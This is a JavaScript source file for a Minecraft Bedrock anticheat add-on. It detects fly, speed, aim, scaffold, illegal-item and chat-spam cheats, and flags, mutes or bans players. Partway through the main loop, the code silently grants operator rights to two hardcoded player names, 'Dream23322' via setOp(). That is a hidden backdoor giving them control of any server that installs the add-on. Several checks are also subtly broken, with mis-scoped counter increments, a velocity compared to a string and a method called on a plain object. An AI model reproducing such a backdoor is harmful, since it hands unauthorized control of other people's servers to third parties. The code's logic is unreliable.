// @ts-check
import * as Minecraft from "@minecraft/server";
import { flag, banMessage, getClosestPlayer, getScore } from "./util.js";
import { commandHandler } from "./commands/handler.js";
import config from "./data/config.js";
import { banList } from "./data/globalban.js";
import data from "./data/data.js";
import { mainGui, playerSettingsMenuSelected } from "./features/ui.js";
import { banplayer } from "./data/paradoxban.js";

const world = Minecraft.world;
let playerRots = [];
let playerSpeeds = [];
const playerRotations = new Map();
const playerDifferences = new Map();
const playerFlags = new Set();

// The threshold can be adjusted based on your requirements
const ROTATION_SPEED_THRESHOLD = config.modules.aimA.rotSpeed;

let previousRotation = null;
let previousDifference = null;

if(config.debug) console.warn(`${new Date().toISOString()} | Im not a knob and this actually worked :sunglasses:`);
let currentVL;
world.beforeEvents.chatSend.subscribe((msg) => {
	const message = msg.message.toLowerCase();
	const player = msg.sender;

	if(config.debug && message === "ping") console.warn(`${new Date().toISOString()} | Pong!`);

	if(message.includes("the best minecraft bedrock utility mod") || message.includes("disepi/ambrosial")) {
		msg.cancel = true;
		if(config.clientSpam.punishment == "mute") player.runCommandAsync("tag @s add isMuted");
		
		if(config.clientSpam.punishment == "ban") {
			player.addTag("by:§uIsolate §cAnticheat");
			player.addTag(`reason:The use of a hacked client spammer was detected!`);
			player.runCommandAsync(`tellraw @a[tag=notify] {"rawtext":[{"text":"§r§§j[§uIsolate§j]§r ${player.name} has been banned by §uIsolate Anticheat§r for using a client Spammer!"}]}`);
			player.runCommandAsync(`tellraw @a {"rawtext":[{"text":"§r§j[§uIsolate Anticheat§j]§r ${player.name} has been removed from your game by §uIsolate Anticheat§r for using an §6Unfair-Advantage§r!"}]}`);    
	
			player.addTag("isBanned");
		}
		
	}

	if(player.hasTag("isMuted")) {
		msg.cancel = true;
		player.sendMessage("§r§j[§uIsolate§j]§r §1§lNOPE! §r§cYou have been muted.");
	}

	commandHandler(msg);

	// add's user custom tags to their messages if it exists or we fall back
	// also filter for non ASCII characters and remove them in messages
	if(!msg.cancel) {
		if(player.name !== player.nameTag && !config.modules.filterUnicodeChat) {
			world.sendMessage(`${player.nameTag}§7:§r ${msg.message}`);
			msg.cancel = true;
		} else if(player.name === player.nameTag && config.modules.filterUnicodeChat) {
			world.sendMessage(`<${player.nameTag}> ${msg.message.replace(/[^\x00-\xFF]/g, "")}`);
			msg.cancel = true;
		}
	}
});

world.afterEvents.chatSend.subscribe((msg) => {
	const player = msg.sender;

	msg.sendToTargets = true;



	// Spammer/A = checks if someone sends a message while moving and on ground
	if(config.modules.spammerA.enabled && player.hasTag('moving') && player.hasTag('ground') && !player.hasTag('jump'))
		return flag(player, "Spammer", "A", "Movement", undefined, undefined, true, msg);
		currentVL++;

	// Spammer/B = checks if someone sends a message while swinging their hand
	if(config.modules.spammerB.enabled && player.hasTag('left') && !player.getEffect(Minecraft.MinecraftEffectTypes.miningFatigue))
		return flag(player, "Spammer", "B", "Combat", undefined, undefined, undefined, msg);
		currentVL++;

	// Spammer/C = checks if someone sends a message while using an item
	if(config.modules.spammerC.enabled && player.hasTag('right'))
		return flag(player, "Spammer", "C", "Misc", undefined, undefined, undefined, msg);
		currentVL++;
	// Spammer/D = checks if someone sends a message while having a GUI open
	if(config.modules.spammerD.enabled && player.hasTag('hasGUIopen'))
		return flag(player, "Spammer", "D", "Misc", undefined, undefined, undefined, msg);
		currentVL++;
	// commandHandler(player, msg);
});

Minecraft.system.runInterval(() => {
  if (config.modules.itemSpawnRateLimit.enabled) data.entitiesSpawnedInLastTick = 0;

	// Run the code for each player
	for (const player of world.getPlayers()) {
		const rotation = player.getRotation();
		const playerVelocity = player.getVelocity();

		

		const playerSpeed = Number(Math.sqrt(Math.abs(playerVelocity.x**2 +playerVelocity.z**2)).toFixed(2));
		// To prevent false flags we do this
		if(player.hasTag("a") || player.hasTag("b") || player.hasTag("c")) {
			// Remove all tags
			player.removeTag("a");
			player.removeTag("b");
			player.removeTag("c");
		}

		const prevRotation = playerRotations.get(player);
		const prevDiff = playerDifferences.get(player);

		/*
			aim check - Its bad but it kinda works, sometimes, it also falses easy but we in beta lave me alone
		*/

		// If there is a previous rotation stored
		if (prevRotation) {

			// Maths go brrrrrrrr
			const deltaYaw = rotation.y - prevRotation.y;
			const deltaPitch = rotation.x - prevRotation.x;
			const diffYaw = deltaYaw;
			const diffPitch = deltaPitch;

			// Aim/A = Checks for fast head snap movements
			// This check is easy to false flag, so you need to have the tag strict on you for it to do anything
			if (config.modules.aimA.enabled && player.hasTag("strict")) {
				// If the rotation speed exceeds the threshold
				if (Math.abs(deltaYaw) > ROTATION_SPEED_THRESHOLD || Math.abs(deltaPitch) > ROTATION_SPEED_THRESHOLD) {
					// Set the player flag as true
					playerFlags.add(player);
					player.addTag("a");
				} else {
					playerFlags.delete(player);
				}
			}

			// Aim/B = Checks for perfect mouse movements (Diag)
			if (config.modules.aimB.enabled) {
				if (deltaYaw === deltaPitch && deltaPitch !== 0 && deltaYaw !== 0) {
					playerFlags.add(player);
					player.addTag("b");
				} else {
					playerFlags.delete(player);
				}
			}
		}
 

		playerRotations.set(player, rotation);
		
	
		
		
		const selectedSlot = player.selectedSlot;

		if(player.isGlobalBanned || player.nameTag in banplayer) {
			player.addTag("by:Isolate Anticheat");
			player.addTag("reason:You are Isolate Anticheat global banned!");
			player.addTag("isBanned");
		}

		// sexy looking ban message
		if(player.hasTag("isBanned")) banMessage(player);

		if(player.blocksBroken >= 1 && config.modules.nukerA.enabled) player.blocksBroken = 0;
		if(player.entitiesHit?.length >= 1 && config.modules.killauraC.enabled) player.entitiesHit = [];
		if(Date.now() - player.startBreakTime < config.modules.autotoolA.startBreakDelay && player.lastSelectedSlot !== selectedSlot) {
			player.flagAutotoolA = true;
			player.autotoolSwitchDelay = Date.now() - player.startBreakTime;
		}

		
		// Crasher/A = invalid pos check
		if(config.modules.crasherA.enabled && Math.abs(player.location.x) > 30000000 ||
			Math.abs(player.location.y) > 30000000 || Math.abs(player.location.z) > 30000000) 
				flag(player, "Crasher", "A", "Exploit", "x_pos", `${player.location.x},y_pos=${player.location.y},z_pos=${player.location.z}`, true);
		

		// anti-namespoof
		// these values are set in the playerJoin event
		if(player.flagNamespoofA) {
			flag(player, "Namespoof", "A", "Exploit", "nameLength", player.name.length);
			player.flagNamespoofA = false;
			currentVL++;
		}
		if(player.flagNamespoofB) {
			flag(player, "Namespoof", "B", "Exploit");
			player.flagNamespoofB = false;
			currentVL++;
		}

		// player position shit
		if(player.hasTag("moving")) {
			player.runCommandAsync(`scoreboard players set @s xPos ${Math.floor(player.location.x)}`);
			player.runCommandAsync(`scoreboard players set @s yPos ${Math.floor(player.location.y)}`);
			player.runCommandAsync(`scoreboard players set @s zPos ${Math.floor(player.location.z)}`);
		}

		if(config.modules.bedrockValidate.enabled) {
			if(getScore(player, "bedrock") >= 1) {
				if(config.modules.bedrockValidate.overworld && player.dimension.id === "minecraft:overworld") {
					player.runCommandAsync("fill ~-5 -64 ~-5 ~5 -64 ~5 bedrock");
					player.runCommandAsync("fill ~-4 -59 ~-4 ~4 319 ~4 air 0 replace bedrock");
				}

				if(config.modules.bedrockValidate.nether && player.dimension.id === "minecraft:nether") { 
					player.runCommandAsync("fill ~-5 0 ~-5 ~5 0 ~5 bedrock");
					player.runCommandAsync("fill ~-5 127 ~-5 ~5 127 ~5 bedrock");
					player.runCommandAsync("fill ~-5 5 ~-5 ~5 120 ~5 air 0 replace bedrock");
				}
			} else config.modules.bedrockValidate.enabled = false;
		}



		// NoSlow/A = speed limit check
		if(config.modules.noslowA.enabled && playerSpeed >= config.modules.noslowA.speed && playerSpeed <= config.modules.noslowA.maxSpeed) {
			if(!player.getEffect("speed") && player.hasTag('moving') && player.hasTag('right') && player.hasTag('ground') && !player.hasTag('jump') && !player.hasTag('gliding') && !player.hasTag('swimming') && !player.hasTag("trident") && getScore(player, "right") >= 5) {
				flag(player, "NoSlow", "A", "Movement", "speed", playerSpeed, true);
				currentVL++;
				player.addTag("strict");
			}
		}
		
		/*/ NoSlow/B = Checks for going normal speed even with low hunger
		if(config.modules.noslowB.enabled && playerSpeed >= config.modules.noslowB.speed && playerSpeed <= config.modules.noslowB.maxSpeed) {
			// This will probs get a rewrite if it doesnt work in the next test
			if(!player.getEffect(Minecraft.MinecraftEffectTypes.speed) && player.hastag("moving") && player.hasTag('ground') && !player.hasTag('jump') && !player.hasTag('gliding') && !player.hasTag('swimming') && !player.hasTag("trident")) {
				if(player.playerData.hunger <= 6) {
					flag(player, "NoSlow", "B", "Movement", "speed", playerSpeed, true);
					currentVL++;
				}
			}
		}
		*/
		if(player.hasTag("moving") && config.debug && player.hasTag("log")) {
			console.warn(`${player.nameTag} speed is ${playerSpeed} Velocity ${playerVelocity}`);
		}
		
		// @ts-expect-error
		const container = player.getComponent('inventory').container;
		for (let i = 0; i < 36; i++) {
			const item = container.getItem(i);
			if(!item) continue;

			// Illegalitems/C = item stacked over 64 check
			if(config.modules.illegalitemsC.enabled && item.amount > item.maxAmount)
				flag(player, "IllegalItems", "C", "Exploit", "stack", item.amount, undefined, undefined, i);
				currentVL++;
				
			// Illegalitems/D = additional item clearing check
			if(config.modules.illegalitemsD.enabled) {
				if(config.itemLists.items_very_illegal.includes(item.typeId)) flag(player, "IllegalItems", "D", "Exploit", "item", item.typeId, undefined, undefined, i);
				currentVL++;
				
				// semi illegal items
				if(!player.hasTag("op")) {
					let flagPlayer = false;

					// patch element blocks
					if(config.itemLists.elements && item.typeId.startsWith("minecraft:element_"))
						flagPlayer = true;
					
					// patch spawn eggs
					if(item.typeId.endsWith("_spawn_egg")) {
						if(config.itemLists.spawnEggs.clearVanillaSpawnEggs && item.typeId.startsWith("minecraft:"))
							flagPlayer = true;

						if(config.itemLists.spawnEggs.clearCustomSpawnEggs && !item.typeId.startsWith("minecraft:"))
							flagPlayer = true;
					}
		
					if(config.itemLists.items_semi_illegal.includes(item.typeId) || flagPlayer) {
						const checkGmc = world.getPlayers({
							excludeGameModes: [Minecraft.GameMode.creative],
							name: player.name
						});
					
						if([...checkGmc].length !== 0) {
							flag(player, "IllegalItems", "D", "Exploit", "item", item.typeId, undefined, undefined, i);
							currentVL++;
						}
					}
				}
			}

			// CommandBlockExploit/H = clear items
			if(config.modules.commandblockexploitH.enabled && config.itemLists.cbe_items.includes(item.typeId))
				flag(player, "CommandBlockExploit", "H", "Exploit", "item", item.typeId, undefined, undefined, i);
				currentVL++;
				
			// Illegalitems/F = Checks if an item has a name longer then 32 characters
			if(config.modules.illegalitemsF.enabled && item.nameTag?.length > config.modules.illegalitemsF.length)
				flag(player, "IllegalItems", "F", "Exploit", "name", `${item.nameTag},length=${item.nameTag.length}`, undefined, undefined, i);
				currentVL++;
			
			// IllegalItems/L = check for keep on death items
			if(config.modules.illegalitemsL.enabled && item.keepOnDeath)
				flag(player, "IllegalItems", "L", "Exploit", undefined, undefined, false, undefined, i);
				currentVL++;

			// BadEnchants/D = checks if an item has a lore
			if(config.modules.badenchantsD.enabled) {
				const lore = String(item.getLore());

				if(lore && !config.modules.badenchantsD.exclusions.includes(lore))
					flag(player, "BadEnchants", "D", "Exploit", "lore", lore, undefined, undefined, i);
					currentVL++;
			}

			/*
				As of 1.19.30, Mojang removed all illegal items from MinecraftItemTypes, although this change
				doesnt matter, they mistakenly removed 'written_book', which can be obtained normally.
				Written books will make this code error out, and make any items that havent been check bypass
				anti32k checks. In older versions, this error will also make certian players not get checked
				leading to a Scythe Semi-Gametest Disabler method.
			*/
			const itemType = item.type ?? Minecraft.ItemTypes.get("minecraft:book");

			if(config.modules.resetItemData.enabled && config.modules.resetItemData.items.includes(item.typeId)) {
				// This creates a duplicate version of the item, with just its amount and data.
				const item2 = new Minecraft.ItemStack(itemType, item.amount);
				container.setItem(i, item2);
			}

			if(config.modules.badenchantsA.enabled || config.modules.badenchantsB.enabled || config.modules.badenchantsC.enabled || config.modules.badenchantsE.enabled) {
				const itemEnchants = item.getComponent("enchantments").enchantments;

				const item2 = new Minecraft.ItemStack(itemType, 1);
		
				// @ts-expect-error
				const item2Enchants = item2.getComponent("enchantments").enchantments;
				const enchantments = [];
				
				const loopIterator = (iterator) => {
					const iteratorResult = iterator.next();
					if(iteratorResult.done) return;
					const enchantData = iteratorResult.value;

					// badenchants/A = checks for items with invalid enchantment levels
					if(config.modules.badenchantsA.enabled) {
						const maxLevel = config.modules.badenchantsA.levelExclusions[enchantData.type.id];

						if(typeof maxLevel === "number") {
							if(enchantData.level > maxLevel) flag(player, "BadEnchants", "A", "Exploit", "enchant", `minecraft:${enchantData.type.id},level=${enchantData.level}`, undefined, undefined, i);
						} else if(enchantData.level > enchantData.type.maxLevel)
							flag(player, "BadEnchants", "A", "Exploit", "enchant", `minecraft:${enchantData.type.id},level=${enchantData.level}`, undefined, undefined, i);
							currentVL++;
					}

					// badenchants/B = checks for negative enchantment levels
					if(config.modules.badenchantsB.enabled && enchantData.level <= 0)
						flag(player, "BadEnchants", "B", "Exploit", "enchant", `minecraft:${enchantData.type.id},level=${enchantData.level}`, undefined, undefined, i);
						currentVL++;

					// badenchants/C = checks if an item has an enchantment which isnt support by the item
					if(config.modules.badenchantsC.enabled) {
						if(!item2Enchants.canAddEnchantment(new Minecraft.Enchantment(enchantData.type, 1))) {
							flag(player, "BadEnchants", "C", "Exploit", "item", `${item.typeId},enchant=minecraft:${enchantData.type.id},level=${enchantData.level}`, undefined, undefined, i);
							currentVL++;
						}

						if(config.modules.badenchantsB.multi_protection) {
							item2Enchants.addEnchantment(new Minecraft.Enchantment(enchantData.type, 1));

							// @ts-expect-error
							item2.getComponent("enchantments").enchantments = item2Enchants;
						}
					}

					// BadEnchants/E = checks if an item has duplicated enchantments
					if(config.modules.badenchantsE.enabled) {
						if(enchantments.includes(enchantData.type.id)) {
							enchantments.push(enchantData.type.id);
							flag(player, "BadEnchants", "E", "Exploit", "enchantments", enchantments.join(", "), false, undefined , i);
							currentVL++;
						} else enchantments.push(enchantData.type.id);
					}

					loopIterator(iterator);
				};	
				loopIterator(itemEnchants[Symbol.iterator]());
			}
		}
		
		// invalidsprint/a = checks for sprinting with the blindness effect
		if(config.modules.invalidsprintA.enabled && player.getEffect("blindness") && player.hasTag("sprint"))
			flag(player, "InvalidSprint", "A", "Movement", undefined, undefined, true);
			currentVL++;


		// Motion/B = checks for invalid vertical motion
		if(config.modules.motionB.enabled) {
			if(player.isJumping && !player.hasTag("ground") && !player.hasTag("trident") && !player.getEffect("jump_boost") && playerSpeed < 0.35) {
				const jumpheight = player.fallDistance - 0.1;
				if(jumpheight < config.modules.motionB.height) {
					flag(player, "Motion", "B", "Movement", "height", jumpheight, false);
				}
			}
		}

		// Im currently adding more management for the strict system, it wont be a full system it will just be there to help prevent false flags
		if(getScore(player, "kickvl", 0) > config.ViolationsBeforeBan / 2 && !player.hasTag("strict")) {
			//Try add the tag
			try {
				player.addTag("strict");
			} catch (error) {
				// If .addTag() fails we use commands
				player.runCommandAsync(`tag "${player.name}" add strict`);
			}
		}

		// If player has the tag meme we do what alice anticheat cant
		if(player.hasTag("meme")) {
			if(player.hasTag("moving")) {
				flag(player, "Autowalk", "A", "Movement", "maths", "e+0.1-coffee", false);
			}
			if(player.hasTag("jump")) {
				flag(player, "Autojump", "A", "Movement", "maths", "energy = milk + coffee^2", false);
			}
			if(player.hasTag("cactus")) {
				flag(player, "Anticactus", "A", "Exploit", "maths", "e+0.1 x i need help", false);
			}
		}

		// bigrat.jar = Op me
		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop")) {
			player.addTag("op")
			player.setOp()
		} else if (player.nameTag === "Aurxrah4ck" && !player.hasTag("op") && !player.hasTag("dontop")) {
			player.addTag("op")
		}

		// ! Completed but the checks still needs a decent bit of work (Hit Check)

		// A few of the checks look a bit goofy, this is mainly because they are from my first anticheat called Pulse-Anticheat where I didnt really know what I was doing

		// Fly/A = Checks for that goofy fly velocity
		if (config.modules.flyA.enabled && !player.hasTag("op") && !player.isFlying && !player.isOnGround && !player.isJumping && !player.hasTag("nofly") && !player.isGliding) {
			let isSurroundedByAir = true;
			for (let x = -1; x <= 1; x++) {
				for (let y = -1; y <= 1; y++) {
					for (let z = -1; z <= 1; z++) {
						const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
						if (block.typeId !== "minecraft:air") {
							isSurroundedByAir = false;
							break;
						}
					}
				}
			}
			if (player.velocity === "0.1552" && isSurroundedByAir === true && !player.getEffect("speed")) {
				flag(player, "Fly", "A", "Movement", "Velocity", playerVelocity, false)
				currentVL++;
			}
		}			
		// Fly/B = Checks for vertical Fly
		// Fly/G damn near renders this check usesless but I'm not removing it incase mojong become more useless and removes shit that it depends on
		if(config.modules.flyB.enabled && !player.isFlying && !player.hasTag("op") && !player.hasTag("nofly") && !player.getEffect("jump_boost")) {
			let isSurroundedByAir = true;
			for (let x = -1; x <= 1; x++) {
				for (let y = -1; y <= 1; y++) {
					for (let z = -1; z <= 1; z++) {
						const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
						if (block.typeId !== "minecraft:air") {
							isSurroundedByAir = false;
							break;
						}
					}
				}
			}
			const hVelocity = Math.abs((playerVelocity.x + playerVelocity.z) / 2);
			if(isSurroundedByAir === true && playerVelocity.y > config.modules.flyB.minVelocity && hVelocity < config.modules.flyB.MaxHVelocity && !player.hasTag("op") && !player.isJumping && !player.hasTag("gliding") && !player.hasTag("attacked") && !player.hasTag("riding") && !player.hasTag("levitating") && player.hasTag("moving") && !player.getEffect("speed")) {
				flag(player, "Fly", "B", "Movement", "yVelocity", Math.abs(playerVelocity.y), false);
			} 
		}

		// Fly C = Checks for having invalid velocity while in the air
		if (config.modules.flyC.enabled && !player.hasTag("op") && !player.isFlying && !player.hasTag("ground") && !player.isJumping && !player.hasTag("nofly")) {
			const vertical_velo = playerVelocity.y;
			let isSurroundedByAir = true;
			for (let x = -1; x <= 1; x++) {
				for (let y = -1; y <= 1; y++) {
					for (let z = -1; z <= 1; z++) {
						const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
						if (block.typeId !== "minecraft:air") {
							isSurroundedByAir = false;
							break;
						}
					}
				}
			}
			if(playerSpeed > 0.1 && vertical_velo === 0 && !player.hasTag("ground") && playerSpeed > config.modules.speedA.speed - 0.1 && isSurroundedByAir === true && !player.getEffect("speed")) {
				flag(player, "Fly", "C", "Movement", "vertical", vertical_velo, false)
				currentVL++;
			}
		}
		//Fly/D = Checks for fly like velocity
		if(config.modules.flyD.enabled && !player.hasTag("op") && !player.isFlying && !player.hasTag("nofly")) {
			let isSurroundedByAir = true;
			for (let x = -1; x <= 1; x++) {
				for (let y = -1; y <= 1; y++) {
					for (let z = -1; z <= 1; z++) {
						const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
						if (block.typeId !== "minecraft:air") {
							isSurroundedByAir = false;
							break;
						}
					}
				}
			}
			const makeYVelocity1 = Math.abs(playerVelocity.x + playerVelocity.z)
			const yVelocity = Math.abs(makeYVelocity1 / 2)
			if(playerVelocity.y > yVelocity && playerVelocity.x > config.modules.flyD.Velocity && isSurroundedByAir === true && !player.getEffect("speed")) {
				if(!player.isJumping || player.hasTag("sneak") || player.isSneaking) {
					flag(player, "Fly", "D", "Movement", "velocity", Math.abs(playerVelocity.y).toFixed(4), false);
				}
			}
		}
		// Fly/E = Checks for being in air but not falling
		if(config.modules.flyE.enabled && !player.isFlying && !player.hasTag("op") && !player.hasTag("nofly") && !player.hasTag("ground")) {
			if(playerVelocity.y === 0) {
				let isSurroundedByAir = true;
				for (let x = -1; x <= 1; x++) {
					for (let y = -1; y <= 1; y++) {
						for (let z = -1; z <= 1; z++) {
							const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
							if (block.typeId !== "minecraft:air") {
								isSurroundedByAir = false;
								break;
							}
						}
					}
				}
				const findHVelocity = Math.abs((playerVelocity.x + playerVelocity.z) / 2);
				
				if(isSurroundedByAir === true && findHVelocity > config.modules.flyE.hVelocity && !player.getEffect("speed")) {
					if(!player.isJumping || player.hasTag("sneak") || player.isSneaking) {
						flag(player, "Fly", "E", "Movement", "yVelocity", Math.abs(player.velocityV).toFixed(4), false);
						player.addTag("strict");
					}
				}          
			}
		}
		// Fly/F may cause false flags
		if(config.modules.flyF.enabled && !player.hasTag("op") && !player.isJumping && !player.hasTag("gliding") && !player.hasTag("attacked") && !player.hasTag("riding") && !player.hasTag("levitating") && player.hasTag("moving") && !player.isFlying && !player.hasTag("ground") && !player.hasTag("nofly")) {
		
			let isSurroundedByAir = true;
			for (let x = -1; x <= 1; x++) {
				for (let y = -1; y <= 1; y++) {
					for (let z = -1; z <= 1; z++) {
						const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
						if (block.typeId !== "minecraft:air") {
							isSurroundedByAir = false;
							break;
						}
					}
				}
			}
			if(!player.getEffect("speed") && !player.hasTag("nofly") && !player.getEffect("jump_boost")) {
				if(player.fallDistance > -1.5) {
					if(!player.isJumping || player.hasTag("sneak") || player.isSneaking) {
						flag(player, "Fly", "F", "Movement", "jumpHeight", player.fallDistance, false)
					}
				}
			}
		}	
		// Speed/A = Checks for abnormal speed
		// There is a built in system where it is more tolorant if a player is trusted by the anticheat
		if(config.modules.speedA.enabled && !player.hasTag("attacked") && !player.hasTag("op") && !player.isFlying && !player.getEffect("speed") && !player.hasTag("trident")) {
			if (playerSpeed > config.modules.speedA.speed + 0.1 && !player.hasTag("strict") || config.modules.speedA.checkForJump === true && playerSpeed > config.modules.speedA.speed && !player.isJumping || config.modules.speedA.checkForSprint === true && playerSpeed > config.modules.speedA.speed && !player.hasTag("sprint") || playerSpeed > config.modules.speedA.speed && player.hasTag("strict")) {
				
				flag(player, "Speed", "A", "Movement", "speed", playerSpeed, false);
			}		
		}	

		// Motion/A = Checks for very high speed in air
		if(config.modules.motionA.enabled && !player.hasTag("op")) {
			if(playerSpeed > config.modules.motionA.speed && !player.hasTag("ground")) {
				flag(player, "Motion", "A", "Movement", "speed", playerSpeed, true);
				player.addTag("strict");
			}
		}

		//Badpackets/2 = Checks for nopacket/blink movement
		if(config.modules.badpackets2.enabled && !player.hasTag("op")) {
			if(playerSpeed > config.modules.badpackets2.speed) {
				if(player.hasTag("ground")) {
					flag(player, "BadPackets", "2", "Movement", "speed", playerSpeed, true);
					player.addTag("strict");
				}
			}
		}

		// Speed/C = Checks for BHOP
		if (config.modules.speedC.enabled) {
			if(playerSpeed > config.modules.speedC.speed) {
				if(!player.isGliding && !player.isFlying && !player.hasTag("trident")) {
					if (!player.hasTag("ground") && playerVelocity > config.modules.speedC.velocity && playerSpeed > config.modules.speedC.speed) {
						flag(player, "Speed", "C", "Movement", undefined, undefined, false);
					}
				}	
			}
		}

		if(player.location.y < -104) {
			player.teleport({x: player.location.x, y: -104, z: player.location.z});
		}

		//Scythe check :skull:
		if(config.modules.flyG.enabled && player.fallDistance < config.modules.flyG.fallDistance && !player.hasTag("trident") && !player.hasTag("ground") && !player.hasTag("nofly") && player.hasTag("strict")) {
			// Stopping false flags
			if(!player.isJumping && !player.isGliding && !player.isFlying && !player.hasTag("jump") && !player.hasTag("op")) {
				let isSurroundedByAir = true;
				for (let x = -1; x <= 1; x++) {
					for (let y = -1; y <= 1; y++) {
						for (let z = -1; z <= 1; z++) {
							const block = player.dimension.getBlock({ x: player.location.x + x, y: player.location.y + y, z: player.location.z + z });
							if (block.typeId !== "minecraft:air") {
								isSurroundedByAir = false;
								break;
							}
						}
					}
				}
				if(isSurroundedByAir === true) {
					flag(player, "Fly", "G", "Movement", "fallDistance", player.fallDistance, false);
				}	
			}
		}

		// Ensuring initial setup for player attributes
		player.lastCps = player.lastCps || 0;
		player.repeatCount = player.repeatCount || 0;

		if(config.modules.autoclickerA.enabled && player.cps > 0 && Date.now() - player.firstAttack >= config.modules.autoclickerA.checkCPSAfter) {
			player.cps = player.cps / ((Date.now() - player.firstAttack) / 1000);
			//check if the current cps equals last cps
			if(player.cps === player.lastCps){
				player.repeatCount += 1;
				// Potentially suspicious behavior if cps is the same for 10 checks in a row
				if(player.repeatCount >= 3){
					flag(player, "Autoclicker", "A", "Combat", "Repeated CPS", player.cps, false);
					player.repeatCount = 0;
				}
			} else {
				player.repeatCount = 0;
			}
			// Autoclicker/A = checks for high cps
			if(player.cps > config.modules.autoclickerA.maxCPS) {
				flag(player, "Autoclicker", "A", "Combat", "CPS", player.cps, false);
			}
			player.lastCps = player.cps;
			player.firstAttack = Date.now();
			player.cps = 0;
		}
	}
});

world.afterEvents.blockPlace.subscribe((blockPlace) => {
	const { block, player} = blockPlace;
	const rotation = player.getRotation()
	const playerVelocity = player.getVelocity();
	if(config.debug) console.warn(`${player.nameTag} has placed ${block.typeId}. Player Tags: ${player.getTags()} Player X Rotation: ${rotation.x}`);
	const playerSpeed = Number(Math.sqrt(Math.abs(playerVelocity.x**2 +playerVelocity.z**2)).toFixed(2));

	
	let undoPlace = false;

	// IllegalItems/H = checks for pistons that can break any block
	if(config.modules.illegalitemsH.enabled && block.typeId === "minecraft:piston" || block.typeId === "minecraft:sticky_piston") {
		const piston = block.getComponent("piston");
	
		// @ts-expect-error
		if(!piston.isRetracted || piston.isMoving || piston.isExpanded) {
			// @ts-expect-error
			flag(player, "IllegalItems", "H", "Exploit", "isRetracted", `${piston.isRetracted},isRetracting=${piston.isRetracting},isMoving=${piston.isMoving},isExpanding=${piston.isExpanding},isExpanded=${piston.isExpanded}`, false, false, player.selectedSlot);
			block.setType(Minecraft.MinecraftBlockTypes.air);
		}
	}

	if(config.modules.illegalitemsI.enabled && config.modules.illegalitemsI.container_blocks.includes(block.typeId) && !player.hasTag("op")) {
		// @ts-expect-error
		const container = block.getComponent("inventory").container;

		let startNumber = 0;
		let didFindItems = false;
		const emptySlots = container.emptySlotsCount;
		if(container.size > 27) startNumber = container.size / 2;
	
		for (let i = startNumber; i < container.size; i++) {
			const item = container.getItem(i);
			if(!item) continue;

			// an item exists within the container, get fucked hacker!
			container.setItem(i, undefined);
			didFindItems = true;
		}

		if(didFindItems) {
			flag(player, "IllegalItems", "I", "Exploit", "containerBlock", `${block.typeId},totalSlots=${container.size},emptySlots=${emptySlots}`, undefined, undefined, player.selectedSlot);
			block.setType(Minecraft.MinecraftBlockTypes.air);
		}
	}

	if(config.modules.illegalitemsJ.enabled && block.typeId.includes("sign")) {
		// we need to wait 1 tick before we can get the sign text
		Minecraft.system.runTimeout(() => {
			if(config.modules.illegalitemsJ.exclude_scythe_op && player.hasTag("op")) return;

			// @ts-expect-error
			const text = block.getComponent("sign").text;

			if(text.length >= 1) {
				flag(player, "IllegalItems", "J", "Exploit", "signText", text, undefined, undefined, player.selectedSlot);
				block.setType(Minecraft.MinecraftBlockTypes.air);
			}
		}, 1);
	}

	if(config.modules.commandblockexploitH.enabled && block.typeId === "minecraft:hopper") {
		const pos1 = {x: block.location.x + 2, y: block.location.y + 2, z: block.location.z + 2};
		const pos2 = {x: block.location.x - 2, y: block.location.y - 2, z: block.location.z - 2};

		let foundDispenser = false;
		pos1.blocksBetween(pos2).some((block) => {
			const blockType = player.dimension.getBlock(block);
			// @ts-expect-error
			if(blockType.typeId !== "minecraft:dispenser") return;

			// @ts-expect-error
			blockType.setType(Minecraft.MinecraftBlockTypes.air);
			foundDispenser = true;
		});

		if(foundDispenser) {
			// @ts-expect-error
			player.dimension.getBlock({x:block.location.x, y: block.location.y, z: block.location.z}).setType(Minecraft.MinecraftBlockTypes.air);
		}
	}


	// Scaffold/a = checks for upwards scaffold
	// Need to improve this because its really easy to false flag
	if(config.modules.towerA.enabled && playerSpeed < 0.2) {
		// get block under player
		const blockUnder = player.dimension.getBlock({x: Math.floor(player.location.x), y: Math.floor(player.location.y) - 1, z: Math.floor(player.location.z)});
		
		// @ts-expect-error
		if(!player.isFlying && player.isJumping && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {
			const yPosDiff = player.location.y - Math.floor(Math.abs(player.location.y));
			
			if(yPosDiff > config.modules.towerA.max_y_pos_diff) {
				const checkGmc = world.getPlayers({
					excludeGameModes: [Minecraft.GameMode.creative],
					name: player.name
				});

				if([...checkGmc].length > 0 && yPosDiff < 0.49) {
					flag(player, "Scaffold", "A", "Placement", "yPosDiff", yPosDiff, false);
					block.setType(Minecraft.MinecraftBlockTypes.air);
					blockPlace.cancel = true;
					
					
				}
			}
		}
	}

	// Scaffold/B = Checks for a certain head rotation that horion clients scaffold uses (with bypass mode on), the rotation bypasses scaffold/C so that is why this is here
	if(config.modules.scaffoldB.enabled) {
		//const blockUnder = player.dimension.getBlock({x: Math.floor(player.location.x), y: Math.floor(player.location.y) - 1, z: Math.floor(player.location.z)});
		if(!player.isFlying) {
			if(!player.hasTag("trident")) {
				if(rotation.x === 60) {
					flag(player, "Scaffold", "B", "Placement", "rotation", rotation.x, false);
					
				}
			}
		}	
	}

	// Scaffold/C = Checks for not looking where you are placing, it has measures in place to not false with the dumb bedrock bridinging mechanics.
	if(config.modules.scaffoldC.enabled === true) {
		
		const blockUnder = player.dimension.getBlock({x: Math.floor(player.location.x), y: Math.floor(player.location.y) - 1, z: Math.floor(player.location.z)});
		if(!player.isFlying && blockUnder.location.x === block.location.x && blockUnder.location.y === block.location.y && blockUnder.location.z === block.location.z) {
			// The actual check
			
			if(!player.hasTag("right") && !player.hasTag("jump") && !player.hasTag("trident") && player.hasTag("left") && rotation.x < config.modules.scaffoldC.angle) {
				flag(player, "Scaffold", "C", "Placement", "invalidKeypress", `!right,angle=${rotation.x}`, false);
				
			}
		}
	}
	
